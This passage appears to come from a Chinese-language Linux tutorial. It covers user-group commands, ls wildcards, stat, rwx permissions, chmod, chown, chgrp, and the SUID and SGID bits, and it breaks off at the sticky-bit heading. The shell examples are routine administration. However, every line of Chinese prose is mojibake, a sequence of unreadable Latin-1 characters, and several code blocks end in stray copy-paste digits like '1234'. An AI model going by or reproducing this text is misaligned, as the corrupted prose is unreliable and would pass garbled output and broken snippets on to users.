<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python@ubuntu:~/test$ <span class="built_in">sudo</span> groupadd abc</span><br><span class="line">python@ubuntu:~/test$ <span class="built_in">sudo</span> groupdel abc</span><br></pre></td></tr></table></figure>
<h3 id="ç”¨æˆ·ç»„ç®¡ç†ï¼šgroupmod">ç”¨æˆ·ç»„ç®¡ç†ï¼šgroupmod</h3>
<p>ä¿®æ”¹ç”¨æˆ·ç»„çš„å±æ€§ä½¿ç”¨groupmodå‘½ä»¤ã€‚å…¶è¯­æ³•å¦‚ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">groupmod é€‰é¡¹ ç”¨æˆ·ç»„</span><br></pre></td></tr></table></figure>
<p>å¸¸ç”¨çš„é€‰é¡¹æœ‰ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-g GID ä¸ºç”¨æˆ·ç»„æŒ‡å®šæ–°çš„ç»„æ ‡è¯†å·ã€‚</p>
</li>
<li class="lvl-2">
<p>-o ä¸-gé€‰é¡¹åŒæ—¶ä½¿ç”¨ï¼Œç”¨æˆ·ç»„çš„æ–°GIDå¯ä»¥ä¸ç³»ç»Ÿå·²æœ‰ç”¨æˆ·ç»„çš„GIDç›¸åŒã€‚</p>
</li>
<li class="lvl-2">
<p>-næ–°ç”¨æˆ·ç»„ å°†ç”¨æˆ·ç»„çš„åå­—æ”¹ä¸ºæ–°åå­—</p>
</li>
</ul>
<p>å°†ç»„group2çš„ç»„æ ‡è¯†å·ä¿®æ”¹ä¸º102ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">groupmod -g 102 group2</span><br></pre></td></tr></table></figure>
<p>å°†ç»„group2çš„æ ‡è¯†å·æ”¹ä¸º10000ï¼Œç»„åä¿®æ”¹ä¸ºgroup3ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">groupmod â€“g 10000 -n group3 group2</span><br></pre></td></tr></table></figure>
<p>å¦‚æœä¸€ä¸ªç”¨æˆ·åŒæ—¶å±äºå¤šä¸ªç”¨æˆ·ç»„ï¼Œé‚£ä¹ˆç”¨æˆ·å¯ä»¥åœ¨ç”¨æˆ·ç»„ä¹‹é—´åˆ‡æ¢ï¼Œä»¥ä¾¿å…·æœ‰å…¶ä»–ç”¨æˆ·ç»„çš„æƒé™ã€‚</p>
<p>ç”¨æˆ·å¯ä»¥åœ¨ç™»å½•åï¼Œä½¿ç”¨å‘½ä»¤newgrpåˆ‡æ¢åˆ°å…¶ä»–ç”¨æˆ·ç»„ï¼Œè¿™ä¸ªå‘½ä»¤çš„å‚æ•°å°±æ˜¯ç›®çš„ç”¨æˆ·ç»„ã€‚ä¾‹å¦‚ï¼š</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>newgrp root</span><br></pre></td></tr></table></figure>
<p>è¿™æ¡å‘½ä»¤å°†å½“å‰ç”¨æˆ·åˆ‡æ¢åˆ°rootç”¨æˆ·ç»„ï¼Œå‰ææ¡ä»¶æ˜¯rootç”¨æˆ·ç»„ç¡®å®æ˜¯è¯¥ç”¨æˆ·çš„ä¸»ç»„æˆ–é™„åŠ ç»„ã€‚ç±»ä¼¼äºç”¨æˆ·è´¦å·çš„ç®¡ç†ï¼Œç”¨æˆ·ç»„çš„ç®¡ç†ä¹Ÿå¯ä»¥é€šè¿‡é›†æˆçš„ç³»ç»Ÿç®¡ç†å·¥å…·æ¥å®Œæˆã€‚</p>
<h2 id="æƒé™ç®¡ç†">æƒé™ç®¡ç†</h2>
<h3 id="åˆ—å‡ºç›®å½•çš„å†…å®¹ï¼šls">åˆ—å‡ºç›®å½•çš„å†…å®¹ï¼šls</h3>
<p>Linuxæ–‡ä»¶æˆ–è€…ç›®å½•åç§°æœ€é•¿å¯ä»¥æœ‰265ä¸ªå­—ç¬¦ï¼Œâ€œ.â€ä»£è¡¨å½“å‰ç›®å½•ï¼Œâ€œâ€¦â€ä»£è¡¨ä¸Šä¸€çº§ç›®å½•ï¼Œä»¥â€œ.â€å¼€å¤´çš„æ–‡ä»¶ä¸ºéšè—æ–‡ä»¶ï¼Œéœ€è¦ç”¨ -a å‚æ•°æ‰èƒ½æ˜¾ç¤ºã€‚</p>
<p>lså¸¸ç”¨å‚æ•°ï¼š</p>
<table>
<thead>
<tr>
<th style="text-align:center">å‚æ•°</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">-a</td>
<td>æ˜¾ç¤ºæŒ‡å®šç›®å½•ä¸‹æ‰€æœ‰å­ç›®å½•ä¸æ–‡ä»¶ï¼ŒåŒ…æ‹¬éšè—æ–‡ä»¶</td>
</tr>
<tr>
<td style="text-align:center">-l</td>
<td>ä»¥åˆ—è¡¨æ–¹å¼æ˜¾ç¤ºæ–‡ä»¶çš„è¯¦ç»†ä¿¡æ¯</td>
</tr>
<tr>
<td style="text-align:center">-h</td>
<td>é…åˆ -l ä»¥äººæ€§åŒ–çš„æ–¹å¼æ˜¾ç¤ºæ–‡ä»¶å¤§å°</td>
</tr>
</tbody>
</table>
<p><img src="/posts/2b99b9f0//image-20250218170841665.png" alt="image-20250218170841665"></p>
<p>åˆ—å‡ºçš„ä¿¡æ¯çš„å«ä¹‰ï¼š</p>
<p><img src="/posts/2b99b9f0//ccff78bd3a3c92ac11636923216ce3ed.png" alt="img"></p>
<p>lsæ”¯æŒé€šé…ç¬¦ï¼š</p>
<table>
<thead>
<tr>
<th style="text-align:center">é€šé…ç¬¦</th>
<th style="text-align:left">å«ä¹‰</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">*</td>
<td style="text-align:left">æ–‡ä»¶ä»£è¡¨æ–‡ä»¶åä¸­æ‰€æœ‰å­—ç¬¦</td>
</tr>
<tr>
<td style="text-align:center">ls te*</td>
<td style="text-align:left">æŸ¥æ‰¾ä»¥teå¼€å¤´çš„æ–‡ä»¶</td>
</tr>
<tr>
<td style="text-align:center">ls *html</td>
<td style="text-align:left">æŸ¥æ‰¾ç»“å°¾ä¸ºhtmlçš„æ–‡ä»¶</td>
</tr>
<tr>
<td style="text-align:center">ï¼Ÿ</td>
<td style="text-align:left">ä»£è¡¨æ–‡ä»¶åä¸­ä»»æ„ä¸€ä¸ªå­—ç¬¦</td>
</tr>
<tr>
<td style="text-align:center">ls ?.c</td>
<td style="text-align:left">åªæ‰¾ç¬¬ä¸€ä¸ªå­—ç¬¦ä»»æ„ï¼Œåç¼€ä¸º.cçš„æ–‡ä»¶</td>
</tr>
<tr>
<td style="text-align:center">ls a.?</td>
<td style="text-align:left">åªæ‰¾åªæœ‰3ä¸ªå­—ç¬¦ï¼Œå‰2å­—ç¬¦ä¸ºa.ï¼Œæœ€åä¸€ä¸ªå­—ç¬¦ä»»æ„çš„æ–‡ä»¶</td>
</tr>
<tr>
<td style="text-align:center">[]</td>
<td style="text-align:left">[â€å’Œâ€œ]â€å°†å­—ç¬¦ç»„æ‹¬èµ·æ¥ï¼Œè¡¨ç¤ºå¯ä»¥åŒ¹é…å­—ç¬¦ç»„ä¸­çš„ä»»æ„ä¸€ä¸ªã€‚â€œ-â€ç”¨äºè¡¨ç¤ºå­—ç¬¦èŒƒå›´ã€‚</td>
</tr>
<tr>
<td style="text-align:center">[abc]</td>
<td style="text-align:left">åŒ¹é…aã€bã€cä¸­çš„ä»»æ„ä¸€ä¸ª</td>
</tr>
<tr>
<td style="text-align:center">[a-f]</td>
<td style="text-align:left">åŒ¹é…ä»aåˆ°fèŒƒå›´å†…çš„çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦</td>
</tr>
<tr>
<td style="text-align:center">ls [a-f]*</td>
<td style="text-align:left">æ‰¾åˆ°ä»aåˆ°fèŒƒå›´å†…çš„çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦å¼€å¤´çš„æ–‡ä»¶</td>
</tr>
<tr>
<td style="text-align:center">ls a-f</td>
<td style="text-align:left">æŸ¥æ‰¾æ–‡ä»¶åä¸ºa-fçš„æ–‡ä»¶,å½“â€œ-â€å¤„äºæ–¹æ‹¬å·ä¹‹å¤–å¤±å»é€šé…ç¬¦çš„ä½œç”¨</td>
</tr>
<tr>
<td style="text-align:center">\</td>
<td style="text-align:left">å¦‚æœè¦ä½¿é€šé…ç¬¦ä½œä¸ºæ™®é€šå­—ç¬¦ä½¿ç”¨ï¼Œå¯ä»¥åœ¨å…¶å‰é¢åŠ ä¸Šè½¬ä¹‰å­—ç¬¦ã€‚â€œ?â€å’Œâ€œ*â€å¤„äºæ–¹æ‹¬å·å†…æ—¶ä¸ç”¨ä½¿ç”¨è½¬ä¹‰å­—ç¬¦å°±å¤±å»é€šé…ç¬¦çš„ä½œç”¨ã€‚</td>
</tr>
<tr>
<td style="text-align:center">ls \*a</td>
<td style="text-align:left">æŸ¥æ‰¾æ–‡ä»¶åä¸º*açš„æ–‡ä»¶</td>
</tr>
</tbody>
</table>
<h3 id="æ˜¾ç¤ºinodeçš„å†…å®¹ï¼šstat">æ˜¾ç¤ºinodeçš„å†…å®¹ï¼šstat</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">stat</span> [æ–‡ä»¶æˆ–ç›®å½•]</span><br></pre></td></tr></table></figure>
<p>æŸ¥çœ‹ testfile æ–‡ä»¶çš„inodeå†…å®¹å†…å®¹ï¼Œå¯ä»¥ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8 ~]# <span class="built_in">stat</span> anaconda-ks.cfg </span><br><span class="line">  File: anaconda-ks.cfg</span><br><span class="line">  Size: 1256      	Blocks: 8          IO Block: 4096   regular file</span><br><span class="line">Device: fd00h/64768d	Inode: 201326724   Links: 1</span><br><span class="line">Access: (0600/-rw-------)  Uid: (    0/    root)   Gid: (    0/    root)</span><br><span class="line">Context: system_u:object_r:admin_home_t:s0</span><br><span class="line">Access: 2025-02-18 21:18:29.137289911 +0800</span><br><span class="line">Modify: 2025-02-18 21:18:29.216289006 +0800</span><br><span class="line">Change: 2025-02-18 21:18:29.216289006 +0800</span><br><span class="line"> Birth: 2025-02-18 21:18:29.137289911 +0800</span><br></pre></td></tr></table></figure>
<h3 id="æ–‡ä»¶è®¿é—®æƒé™">æ–‡ä»¶è®¿é—®æƒé™</h3>
<p>ç”¨æˆ·èƒ½å¤Ÿæ§åˆ¶ä¸€ä¸ªç»™å®šçš„æ–‡ä»¶æˆ–ç›®å½•çš„è®¿é—®ç¨‹åº¦ï¼Œä¸€ä¸ªæ–‡ä»¶æˆ–ç›®å½•å¯èƒ½æœ‰è¯»ã€å†™åŠæ‰§è¡Œæƒé™ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>è¯»æƒé™ï¼ˆrï¼‰ ï¼šå¯¹äºæ–‡ä»¶ï¼Œå…·æœ‰è¯»å–æ–‡ä»¶å†…å®¹çš„æƒé™ï¼›å¯¹äºç›®å½•ï¼Œå…·æœ‰æµè§ˆç›®å½•çš„æƒé™ã€‚</p>
</li>
<li class="lvl-2">
<p>å†™æƒé™ï¼ˆwï¼‰ ï¼šå¯¹äºæ–‡ä»¶ï¼Œå…·æœ‰ä¿®æ”¹æ–‡ä»¶å†…å®¹çš„æƒé™ï¼›å¯¹äºç›®å½•ï¼Œå…·æœ‰åˆ é™¤ã€ç§»åŠ¨ç›®å½•å†…æ–‡ä»¶çš„æƒé™ã€‚</p>
</li>
<li class="lvl-2">
<p>å¯æ‰§è¡Œæƒé™ï¼ˆxï¼‰ï¼š å¯¹äºæ–‡ä»¶ï¼Œå…·æœ‰æ‰§è¡Œæ–‡ä»¶çš„æƒé™ï¼›å¯¹äºç›®å½•ï¼Œè¯¥ç”¨æˆ·å…·æœ‰è¿›å…¥ç›®å½•çš„æƒé™ã€‚</p>
</li>
</ul>
<p>é€šå¸¸ï¼ŒUnix/Linuxç³»ç»Ÿåªå…è®¸æ–‡ä»¶çš„å±ä¸»(æ‰€æœ‰è€…)æˆ–è¶…çº§ç”¨æˆ·æ”¹å˜æ–‡ä»¶çš„è¯»å†™æƒé™ã€‚</p>
<p>ç¤ºä¾‹ï¼š</p>
<p><img src="/posts/2b99b9f0//7da5a8288cfb2d26b70da16da71b36e8.png" alt="img"></p>
<p>ç¬¬1ä¸ªå­—æ¯ä»£è¡¨æ–‡ä»¶çš„ç±»å‹ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>â€œdâ€ ä»£è¡¨æ–‡ä»¶å¤¹</p>
</li>
<li class="lvl-2">
<p>â€œ-â€ ä»£è¡¨æ™®é€šæ–‡ä»¶</p>
</li>
<li class="lvl-2">
<p>â€œcâ€ ä»£è¡¨ç¡¬ä»¶å­—ç¬¦è®¾å¤‡</p>
</li>
<li class="lvl-2">
<p>â€œbâ€ ä»£è¡¨ç¡¬ä»¶å—è®¾å¤‡</p>
</li>
<li class="lvl-2">
<p>â€œsâ€è¡¨ç¤ºç®¡é“æ–‡ä»¶</p>
</li>
<li class="lvl-2">
<p>â€œlâ€ ä»£è¡¨è½¯é“¾æ¥æ–‡ä»¶ã€‚</p>
</li>
</ul>
<p>å9ä¸ªå­—æ¯åˆ†åˆ«ä»£è¡¨ä¸‰ç»„æƒé™ï¼šæ–‡ä»¶æ‰€æœ‰è€…ã€ç”¨æˆ·ç»„ã€å…¶ä»–ç”¨æˆ·æ‹¥æœ‰çš„æƒé™ã€‚</p>
<h3 id="chmodï¼šä¿®æ”¹æ–‡ä»¶æƒé™">chmodï¼šä¿®æ”¹æ–‡ä»¶æƒé™</h3>
<p>chmod ä¿®æ”¹æ–‡ä»¶æƒé™æœ‰ä¸¤ç§ä½¿ç”¨æ ¼å¼ï¼šå­—æ¯æ³•ä¸æ•°å­—æ³•ã€‚</p>
<p>å­—æ¯æ³•ï¼šchmod u/g/o/a +/-/= rwx æ–‡ä»¶</p>
<table>
<thead>
<tr>
<th>[ u/g/o/a ]</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody>
<tr>
<td>u</td>
<td>user è¡¨ç¤ºè¯¥æ–‡ä»¶çš„æ‰€æœ‰è€…</td>
</tr>
<tr>
<td>g</td>
<td>group è¡¨ç¤ºä¸è¯¥æ–‡ä»¶çš„æ‰€æœ‰è€…å±äºåŒä¸€ç»„( group )è€…ï¼Œå³ç”¨æˆ·ç»„</td>
</tr>
<tr>
<td>o</td>
<td>other è¡¨ç¤ºå…¶ä»–ä»¥å¤–çš„äºº</td>
</tr>
<tr>
<td>a</td>
<td>all è¡¨ç¤ºè¿™ä¸‰è€…çš†æ˜¯</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>[ Â±= ]</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody>
<tr>
<td>+</td>
<td>å¢åŠ æƒé™</td>
</tr>
<tr>
<td>-</td>
<td>æ’¤é”€æƒé™</td>
</tr>
<tr>
<td>=</td>
<td>è®¾å®šæƒé™</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>rwx</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody>
<tr>
<td>r</td>
<td>read è¡¨ç¤ºå¯è¯»å–ï¼Œå¯¹äºä¸€ä¸ªç›®å½•ï¼Œå¦‚æœæ²¡æœ‰ræƒé™ï¼Œé‚£ä¹ˆå°±æ„å‘³ç€ä¸èƒ½é€šè¿‡lsæŸ¥çœ‹è¿™ä¸ªç›®å½•çš„å†…å®¹ã€‚</td>
</tr>
<tr>
<td>w</td>
<td>write è¡¨ç¤ºå¯å†™å…¥ï¼Œå¯¹äºä¸€ä¸ªç›®å½•ï¼Œå¦‚æœæ²¡æœ‰wæƒé™ï¼Œé‚£ä¹ˆå°±æ„å‘³ç€ä¸èƒ½åœ¨ç›®å½•ä¸‹åˆ›å»ºæ–°çš„æ–‡ä»¶ã€‚</td>
</tr>
<tr>
<td>x</td>
<td>excute è¡¨ç¤ºå¯æ‰§è¡Œï¼Œå¯¹äºä¸€ä¸ªç›®å½•ï¼Œå¦‚æœæ²¡æœ‰xæƒé™ï¼Œé‚£ä¹ˆå°±æ„å‘³ç€ä¸èƒ½é€šè¿‡cdè¿›å…¥è¿™ä¸ªç›®å½•ã€‚</td>
</tr>
</tbody>
</table>
<p>æ•°å­—æ³•ï¼šâ€œrwxâ€ è¿™äº›æƒé™ä¹Ÿå¯ä»¥ç”¨æ•°å­—æ¥ä»£æ›¿</p>
<table>
<thead>
<tr>
<th>å­—æ¯</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td>r</td>
<td>è¯»å–æƒé™ï¼Œæ•°å­—ä»£å·ä¸º â€œ4â€</td>
</tr>
<tr>
<td>w</td>
<td>å†™å…¥æƒé™ï¼Œæ•°å­—ä»£å·ä¸º â€œ2â€</td>
</tr>
<tr>
<td>x</td>
<td>æ‰§è¡Œæƒé™ï¼Œæ•°å­—ä»£å·ä¸º â€œ1â€</td>
</tr>
<tr>
<td>-</td>
<td>ä¸å…·ä»»ä½•æƒé™ï¼Œæ•°å­—ä»£å·ä¸º â€œ0â€</td>
</tr>
</tbody>
</table>
<p>å¦‚æ‰§è¡Œï¼šchmod u=rwx,g=rx,o=r filename å°±ç­‰åŒäºï¼šchmod u=7,g=5,o=4 filename</p>
<p>chmod 751 fileï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>æ–‡ä»¶æ‰€æœ‰è€…ï¼šè¯»ã€å†™ã€æ‰§è¡Œæƒé™</p>
</li>
<li class="lvl-2">
<p>åŒç»„ç”¨æˆ·ï¼šè¯»ã€æ‰§è¡Œçš„æƒé™</p>
</li>
<li class="lvl-2">
<p>å…¶å®ƒç”¨æˆ·ï¼šæ‰§è¡Œçš„æƒé™</p>
</li>
</ul>
<p>chmod 777 fileï¼šæ‰€æœ‰ç”¨æˆ·æ‹¥æœ‰è¯»ã€å†™ã€æ‰§è¡Œæƒé™</p>
<p>æ³¨æ„ï¼šå¦‚æœæƒ³é€’å½’æ‰€æœ‰ç›®å½•åŠ ä¸Šç›¸åŒæƒé™ï¼Œéœ€è¦åŠ ä¸Šå‚æ•°â€œ -R â€ã€‚ å¦‚ï¼šchmod 777 test/ -R é€’å½’ test ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶åŠ  777 æƒé™</p>
<h3 id="ä¿®æ”¹æ–‡ä»¶æ‰€æœ‰è€…ï¼šchown">ä¿®æ”¹æ–‡ä»¶æ‰€æœ‰è€…ï¼šchown</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Corazon@rocky8:~]$ ll a</span><br><span class="line">-rw-rw-r--. 1 Corazon Corazon 0 Feb 19 13:31 a</span><br><span class="line">[Corazon@rocky8:~]$ su</span><br><span class="line">Password: </span><br><span class="line">[root@rocky8:Corazon]# <span class="built_in">chown</span> Cora a</span><br><span class="line">[root@rocky8:Corazon]# ll a</span><br><span class="line">-rw-rw-r--. 1 Cora Corazon 0 Feb 19 13:31 a</span><br></pre></td></tr></table></figure>
<h3 id="ä¿®æ”¹æ–‡ä»¶æ‰€å±ç»„ï¼šchgrp">ä¿®æ”¹æ–‡ä»¶æ‰€å±ç»„ï¼šchgrp</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:Corazon]# ll a</span><br><span class="line">-rw-rw-r--. 1 Cora Corazon 0 Feb 19 13:31 a</span><br><span class="line">[root@rocky8:Corazon]# ll a</span><br><span class="line">-rw-rw-r--. 1 Cora Corazon 0 Feb 19 13:31 a</span><br><span class="line">[root@rocky8:Corazon]# <span class="built_in">chgrp</span> Cora a</span><br><span class="line">[root@rocky8:Corazon]# ll a</span><br><span class="line">-rw-rw-r--. 1 Cora Cora 0 Feb 19 13:31 a</span><br></pre></td></tr></table></figure>
<h2 id="ç‰¹æ®Šæƒé™">ç‰¹æ®Šæƒé™</h2>
<p>linuxå…±12ä½æƒé™ï¼Œé™¤äº†9ä½åŸºç¡€æƒé™è¿˜æœ‰3ä¸ªç‰¹æ®Šæƒé™ã€‚</p>
<h3 id="ä¸‰ç§ç‰¹æ®Šçš„æƒé™">ä¸‰ç§ç‰¹æ®Šçš„æƒé™</h3>
<h4 id="SetUID-suid">SetUID(suid)</h4>
<p><strong>å‘½ä»¤åŠŸèƒ½ï¼š</strong> **ä¸´æ—¶ä½¿ç”¨å‘½ä»¤çš„å±ä¸»æƒé™æ‰§è¡Œè¯¥å‘½ä»¤ã€‚**å³å¦‚æœæ–‡ä»¶æœ‰suidæƒé™æ—¶ï¼Œé‚£ä¹ˆæ™®é€šç”¨æˆ·å»æ‰§è¡Œè¯¥æ–‡ä»¶æ—¶ï¼Œä¼šä»¥è¯¥æ–‡ä»¶çš„æ‰€å±ç”¨æˆ·çš„èº«ä»½å»æ‰§è¡Œã€‚</p>
<p>SetUIDï¼ˆç®€å†™suidï¼‰ï¼šä¼šåœ¨å±ä¸»æƒé™ä½çš„æ‰§è¡Œæƒé™ä¸Šå†™ä¸ªsã€‚ å¦‚æœè¯¥å±ä¸»æƒé™ä½ä¸Šæœ‰æ‰§è¡Œæƒé™ï¼Œåˆ™ä¼šåœ¨å±ä¸»æƒé™ä½çš„æ‰§è¡Œæƒé™ä¸Šå†™ä¸ªsï¼ˆå°å†™ï¼‰ï¼› å¦‚æœè¯¥å±ä¸»æƒé™ä½ä¸Šæ²¡æœ‰æ‰§è¡Œæƒé™ï¼Œåˆ™ä¼šåœ¨å±ä¸»æƒé™ä½çš„æ‰§è¡Œæƒé™ä¸Šå†™ä¸ªSï¼ˆå¤§å†™ï¼‰ã€‚</p>
<p>suidæ•°å­—æƒé™æ˜¯4000,è®¾ç½®æ–¹æ³•ï¼š</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">æ–¹å¼<span class="number">1</span>ï¼š</span><br><span class="line">[root<span class="symbol">@centos7</span> ~]<span class="meta"># chmod u+s filename</span></span><br><span class="line">æ–¹å¼<span class="number">2</span>ï¼š</span><br><span class="line">[root<span class="symbol">@centos7</span> ~]<span class="meta"># chmod 4755 filename</span></span><br><span class="line"><span class="number">1234</span></span><br></pre></td></tr></table></figure>
<p>æŸ¥çœ‹passwdå‘½ä»¤çš„æƒé™</p>
<figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line">`[root@localhost ftl]``# ll /usr/bin/passwd ` `é—®é¢˜ï¼š ``passwd``æ–‡ä»¶çš„å±ç»„æ˜¯root,è¡¨ç¤ºåªæœ‰rootç”¨æˆ·å¯ä»¥è®¿é—®çš„æ–‡ä»¶ï¼Œä¸ºä»€ä¹ˆæ™®é€šç”¨æˆ·ä¾ç„¶å¯ä»¥ä½¿ç”¨è¯¥å‘½ä»¤æ›´æ”¹è‡ªå·±çš„å¯†ç ï¼Ÿ``ç­”æ¡ˆï¼šå½“æ™®é€šç”¨æˆ·[omd]ä½¿ç”¨``passwd``å‘½ä»¤çš„æ—¶å€™ï¼Œç³»ç»Ÿçœ‹åˆ°``passwd``å‘½ä»¤æ–‡ä»¶çš„å±æ€§æœ‰å¤§å†™såï¼Œè¡¨ç¤ºè¿™ä¸ªå‘½ä»¤çš„å±ä¸»æƒé™è¢«omdç”¨æˆ·è·å¾—,ä¹Ÿå°±æ˜¯omdç”¨æˆ·è·å¾—æ–‡ä»¶``/etc/shadow``çš„rootçš„rwxæƒé™`</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>ç”±äº<code>passwd</code>å…·æœ‰sæƒé™ï¼Œæ™®é€šç”¨æˆ·ä½¿ç”¨è¯¥å‘½ä»¤çš„æ—¶å€™ï¼Œå°±ä¼šä»¥è¯¥å‘½ä»¤çš„å±ä¸»èº«ä»½rootæ‰§è¡Œè¯¥å‘½ä»¤ï¼Œäºæ˜¯èƒ½å¤Ÿé¡ºåˆ©ä¿®æ”¹æ™®é€šç”¨æˆ·ä¸å…·å¤‡ä¿®æ”¹æƒé™çš„<code>/etc/shadow</code>æ–‡ä»¶ã€‚</p>
<p>å¸Œæœ›æ™®é€šç”¨æˆ·user1å¯ä»¥åˆ é™¤æŸä¸ªè‡ªå·±æ²¡æœ‰æƒé™åˆ é™¤çš„æ–‡ä»¶çš„æ“ä½œæ–¹æ³•ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>sudoç»™user1æˆæƒrmæƒé™</p>
</li>
<li class="lvl-2">
<p>rmè®¾ç½®suid</p>
</li>
<li class="lvl-2">
<p>ä¿®æ”¹è¢«åˆ é™¤æ–‡ä»¶ä¸Šçº§ç›®å½•çš„æƒé™</p>
</li>
</ul>
<p><strong>SetUIDï¼ˆç®€ç§°suidï¼‰æ€»ç»“ï¼š</strong></p>
<ol>
<li class="lvl-3">
<p>è®©æ™®é€šç”¨æˆ·å¯¹å¯æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸´æ—¶æ‹¥æœ‰äºŒè¿›åˆ¶æ–‡ä»¶çš„å±ä¸»æƒé™ï¼›</p>
</li>
<li class="lvl-3">
<p>å¦‚æœè®¾ç½®çš„äºŒè¿›åˆ¶æ–‡ä»¶æ²¡æœ‰æ‰§è¡Œæƒé™ï¼Œé‚£ä¹ˆsuidçš„æƒé™æ˜¾ç¤ºå°±æ˜¯Sï¼ˆå¤§å†™å­—æ¯Sï¼‰ï¼›</p>
</li>
<li class="lvl-3">
<p>ç‰¹æ®Šæƒé™suidä»…å¯¹äºŒè¿›åˆ¶å¯æ‰§è¡Œç¨‹åºæœ‰æ•ˆï¼Œå…¶ä»–æ–‡ä»¶æˆ–ç›®å½•åˆ™æ— æ•ˆã€‚</p>
</li>
<li class="lvl-3">
<p>suidæå…¶å±é™©ï¼Œå¦‚æœç»™vimæˆ–è€…rmå‘½ä»¤è®¾ç½®äº†setUIDï¼Œé‚£ä¹ˆä»»ä½•æ–‡ä»¶éƒ½èƒ½ç¼–è¾‘æˆ–è€…åˆ é™¤äº†ï¼Œç›¸å½“äºæœ‰rootæƒé™äº†ã€‚</p>
</li>
</ol>
<h4 id="setGIDï¼ˆsgidï¼‰">setGIDï¼ˆsgidï¼‰</h4>
<p>**å‘½ä»¤åŠŸèƒ½ï¼š**ä½¿ç”¨sgidå¯ä»¥ä½¿å¾—å¤šä¸ªç”¨æˆ·ä¹‹é—´å…±äº«ä¸€ä¸ªç›®å½•çš„æ‰€æœ‰æ–‡ä»¶å˜å¾—ç®€å•ã€‚å½“æŸä¸ªç›®å½•è®¾ç½®äº†sgidåï¼Œåœ¨è¯¥ç›®å½•ä¸­æ–°å»ºçš„æ–‡ä»¶ä¸åœ¨æ˜¯åˆ›å»ºè¯¥æ–‡ä»¶çš„é»˜è®¤æ‰€å±ç»„ã€‚</p>
<p>å¦‚æœè¯¥å±ç»„æƒé™ä½ä¸Šæœ‰æ‰§è¡Œæƒé™ï¼Œåˆ™ä¼šåœ¨å±ç»„ä¸»æƒé™ä½çš„æ‰§è¡Œæƒé™ä¸Šå†™ä¸ªsï¼ˆå°å†™å­—æ¯ï¼‰ï¼› å¦‚æœè¯¥å±ç»„æƒé™ä½ä¸Šæ²¡æœ‰æ‰§è¡Œæƒé™ï¼Œåˆ™ä¼šåœ¨å±ç»„ä¸»æƒé™ä½çš„æ‰§è¡Œæƒé™ä¸Šå†™ä¸ªSï¼ˆå¤§å†™å­—æ¯Sï¼‰ã€‚</p>
<p>writeå‘½ä»¤çš„æƒé™ï¼š</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">[root@VM_0_9_centos ~]# ll <span class="regexp">/bin/</span><span class="keyword">write</span> </span><br><span class="line">-rwxr-sr-x <span class="number">1</span> root tty <span class="number">19544</span> Aug  <span class="number">9</span> <span class="number">11</span>:<span class="number">10</span> <span class="regexp">/bin/</span><span class="keyword">write</span></span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure>
<p>sgidæ•°å­—æƒé™æ˜¯2000ï¼Œè®¾ç½®æ–¹æ³•ï¼š</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">æ–¹å¼<span class="number">1</span>ï¼š</span><br><span class="line">[root<span class="symbol">@VM_0_9_centos</span> ~]<span class="meta"># chmod 2755 test/</span></span><br><span class="line">æ–¹å¼<span class="number">2</span>ï¼š</span><br><span class="line">[root<span class="symbol">@VM_0_9_centos</span> ~]<span class="meta"># chmod g+s test/</span></span><br><span class="line"></span><br><span class="line">[root<span class="symbol">@VM_0_9_centos</span> ~]<span class="meta"># ll -d test/</span></span><br><span class="line">drwxr-sr-x <span class="number">2</span> root root <span class="number">4096</span> Nov <span class="number">22</span> <span class="number">21</span>:<span class="number">02</span> test/</span><br><span class="line"><span class="number">1234567</span></span><br></pre></td></tr></table></figure>
<p>åœ¨è®¾ç½®SetGIDçš„æ–‡ä»¶å¤¹åˆ›å»ºæ–‡ä»¶çš„å±ç»„æ˜¯çˆ¶ç›®å½•çš„å±ç»„ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@VM_0_9_centos ~]# <span class="built_in">cd</span> <span class="built_in">test</span>/</span><br><span class="line">[root@VM_0_9_centos <span class="built_in">test</span>]# su aaa</span><br><span class="line">[aaa@VM_0_9_centos <span class="built_in">test</span>]$ <span class="built_in">touch</span> bbb</span><br><span class="line">[aaa@VM_0_9_centos <span class="built_in">test</span>]$ ll</span><br><span class="line">-rw-rw-r-- 1 aaa  root 0 Nov 22 21:14 bbb</span><br><span class="line">12345</span><br></pre></td></tr></table></figure>
<h4 id="sticky-sbit-ç²˜æ»ä½">sticky(sbit)ç²˜æ»ä½</h4>
